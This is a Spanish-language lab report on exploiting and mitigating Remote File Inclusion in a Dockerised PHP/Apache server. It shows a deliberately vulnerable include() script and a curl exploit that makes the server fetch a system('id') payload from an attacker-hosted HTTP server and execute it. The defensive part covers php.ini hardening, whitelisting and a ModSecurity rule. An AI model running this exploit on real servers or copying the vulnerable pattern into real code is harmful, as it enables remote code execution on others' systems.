# Informe Técnico: Explotación y Mitigación de RFI (Remote File Inclusion)

## 1. Introducción

RFI (Remote File Inclusion) es una vulnerabilidad crítica que permite a un atacante
incluir y ejecutar archivos remotos maliciosos en un servidor web mediante la
manipulación de parámetros de entrada no validados.

**Clasificación OWASP:** A03:2021 – Injection  
**Severidad:** Crítica  
**CVSS Score:** 9.8 (Critical)

---

## 2. Entorno de Laboratorio

| Elemento | Detalle |
|---|---|
| Servidor vulnerable | Docker Desktop (PHP 8 + Apache) |
| Máquina atacante | Kali Linux vía WSL2 |
| Herramienta de exploit | curl |
| Servidor de payload | Python HTTP Server |
| Captura de tráfico | Wireshark |
| IP atacante (WSL) | 172.31.3.212 |
| Puerto servidor web | 80 |
| Puerto payload | 8000 |

---

## 3. Código Vulnerable Analizado

**Archivo:** `rfi.php`

```php
<?php
$file = $_GET['file'];
include($file);
?>
```

**Problemas identificados:**
- El parámetro `$_GET['file']` se usa directamente en `include()`.
- Sin validación, sanitización ni whitelist.
- Permite incluir cualquier URL o ruta de archivo.

---

## 4. Pasos del Ataque

### Paso 1 – Verificar vulnerabilidad

Acceso inicial para confirmar que el parámetro `file` es controlable:

```bash
curl "http://localhost/rfi.php?file=test"
```

**Resultado:** Warning de PHP confirmando que intenta incluir el archivo
pasado por parámetro.

---

### Paso 2 – Preparar el entorno Docker

El contenedor tenía `allow_url_include=Off` por defecto (PHP 8).
Se accedió a la terminal del contenedor desde Docker Desktop y se activó:

```bash
echo 'allow_url_include=On' >> /usr/local/etc/php/php.ini
apache2ctl restart
```

Verificación:
```bash
php -r "echo ini_get('allow_url_include');"
# Salida: Deprecated warning + valor "On" confirmado
```

---

### Paso 3 – Crear payload malicioso

Desde WSL (máquina atacante):

```bash
echo '<?php echo "RFI EXITOSO"; system("id"); ?>' > shell.txt
```

Contenido de `shell.txt`:
```php
<?php echo "RFI EXITOSO"; system("id"); ?>
```

---

### Paso 4 – Levantar servidor HTTP (atacante)

```bash
python3 -m http.server 8000
```

El servidor sirve `shell.txt` en `http://172.31.3.212:8000/shell.txt`.

---

### Paso 5 – Ejecutar el exploit

```bash
curl "http://localhost/rfi.php?file=http://172.31.3.212:8000/shell.txt"
```

**Resultado obtenido:**
```
RFI EXITOSO
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El servidor vulnerable descargó y ejecutó el código malicioso del atacante.

---

### Paso 6 – Flujo del ataque capturado en Wireshark

```
[Atacante] → GET /rfi.php?file=http://172.31.3.212:8000/shell.txt → [Docker]
[Docker]   → GET /shell.txt                                        → [Atacante]
[Atacante] → 200 OK + contenido PHP                                → [Docker]
[Docker]   → Ejecuta PHP → Responde "RFI EXITOSO + uid=33"         → [Atacante]
```

---

## 5. Impacto de la Vulnerabilidad

| Impacto | Descripción |
|---|---|
| Ejecución de código remoto | El atacante ejecuta cualquier comando en el servidor |
| Robo de información | Lectura de `/etc/passwd`, configs, credenciales |
| Backdoor persistente | Instalación de webshell para acceso futuro |
| Escalada de privilegios | Desde www-data a root mediante exploits locales |
| Compromiso total | Control completo del servidor y sus datos |

---

## 6. Medidas de Mitigación

### 6.1 Deshabilitar wrappers remotos en PHP (CRÍTICO)

Editar `/usr/local/etc/php/php.ini`:
```ini
allow_url_include = Off
allow_url_fopen = Off
```

**Es la medida más importante.** Sin esta configuración, el ataque
no es posible vía HTTP.

---

### 6.2 Validación con Whitelist (CRÍTICO)

```php
<?php
$allowed_files = ['home', 'about', 'contact', 'services'];
$file = $_GET['file'] ?? '';

if (!in_array($file, $allowed_files)) {
    http_response_code(403);
    die('Acceso denegado.');
}

include($file . '.php');
?>
```

Solo se permiten archivos explícitamente definidos.

---

### 6.3 Sanitización de entrada

```php
<?php
$file = basename(strip_tags($_GET['file'] ?? ''));
$file = str_replace(['../', 'http://', 'https://', 'ftp://'], '', $file);
$full_path = realpath(__DIR__ . '/pages/' . $file . '.php');

if (!$full_path || !str_starts_with($full_path, __DIR__)) {
    die('Ruta no válida.');
}

include($full_path);
?>
```

---

### 6.4 Medidas de infraestructura

| Medida | Implementación |
|---|---|
| WAF | Bloquear patrones `http://`, `https://`, `ftp://` en parámetros |
| Permisos | Usuario web solo accede a su directorio (`www-data`) |
| Firewall | Bloquear conexiones salientes desde el servidor web |
| Actualizaciones | Mantener PHP y Apache actualizados |
| Logs | Monitorizar parámetros con URLs en logs de Apache |

---

### 6.5 Regla WAF (ModSecurity)

```apache
SecRule ARGS "@rx (http|https|ftp)://" \
  "id:1001,phase:2,deny,status:403,msg:'RFI attempt detected'"
```

---

## 7. Conclusión

La vulnerabilidad RFI es crítica y trivial de explotar cuando
`allow_url_include=On`. En este laboratorio se demostró cómo un
atacante puede ejecutar código arbitrario en el servidor con solo
una petición HTTP.

La mitigación principal es desactivar `allow_url_include` en `php.ini`
combinada con validación estricta por whitelist en el código. Ninguna
medida aislada es suficiente; se requiere una estrategia de defensa
en profundidad.

---